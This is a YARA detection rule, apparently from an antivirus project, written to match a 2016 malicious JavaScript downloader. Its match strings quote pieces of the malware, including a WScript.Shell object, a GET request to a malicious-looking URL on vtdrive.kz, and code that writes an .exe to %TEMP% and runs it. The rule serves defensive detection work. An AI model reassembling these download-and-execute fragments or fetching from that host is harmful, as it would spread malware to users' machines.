rule sig_20160330_2f6e322ea47c1eccd0f00f51480f0063 {
  meta:
    description = "datamaliciousorder - file 20160330_2f6e322ea47c1eccd0f00f51480f0063.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7b74f125dfe431c45e23a81aa856e8c94ec0a4413c55d9bfc16332ff328ad9b2"

  strings:
    $s1  = "var QM = function KI() {return WScript[JS](\"WScript\"+\".Shell\");}(), T = 11;" fullword ascii
    $s2  = "UW[V](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s3  = "function LU(LA, JF){NS = NS * 1; return LA - JF;};" fullword ascii
    $s4  = "if (UW[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GC() {return QM[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"g65yUveOurle4PF.ex\" + \"e\";};" fullword ascii
    $s6  = "function YT(){return R + \"\";};" fullword ascii
    $s7  = "function O(ME){QM[\"Run\"](ME, NS, NS);};" fullword ascii
    $s8  = "function S() {return ((K == true) && (K == C)) ? 1 : NS;};" fullword ascii
    $s9  = "function A(){return 22;};" fullword ascii
    $s10 = "}while (Q);" fullword ascii
    $s11 = "function VE(){return JS;};" fullword ascii
    $s12 = "return LU(Z, WA);" fullword ascii
    $s13 = "function BI(Y) {var ZT = (1, 2, 3, 4, 5, Y); return ZT;};" fullword ascii
    $s14 = "var PR = new this[\"Date\"]();" fullword ascii
    $s15 = "function HL()" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var C = false;" fullword ascii
    $s19 = "C = true; " fullword ascii
    $s20 = "var BK = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}